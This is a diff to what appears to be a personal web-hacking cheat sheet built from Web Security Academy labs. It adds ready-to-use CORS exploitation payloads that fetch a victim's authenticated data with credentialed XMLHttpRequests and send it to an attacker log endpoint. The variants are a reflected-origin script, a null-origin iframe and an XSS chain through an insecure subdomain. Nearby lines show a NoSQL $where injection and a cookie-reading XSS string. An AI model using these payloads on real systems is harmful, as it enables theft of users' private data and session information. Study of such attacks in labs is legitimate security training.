@@ -346,8 +346,42 @@ Get fields name
 ```
 "$where":"Object.keys(this)[0].match('^.{0}a.*')"
 ```
+###CORS
+Default script, when server just reflect our origin.
+```
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
 
+function reqListener() {
+	location='//malicious-website.com/log?key='+this.responseText;
+};
 
+```
+Default script, when server allow null. Use iframe, because it doesn't have origin.
+
+```
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='malicious-website.com/log?key='+this.responseText;
+};
+</script>"></iframe>
+```
+Sometimes CORS is set up correct, but it allow requests from his http subdomains, then
+```
+<script>
+document.location="http://stock.0a8d0004030bc63982c358ab00f600d7.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a8d0004030bc63982c358ab00f600d7.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
+Note - encode < to not have errors
 ###XSS
 
 "-alert(window["document"]["cookie"])-"
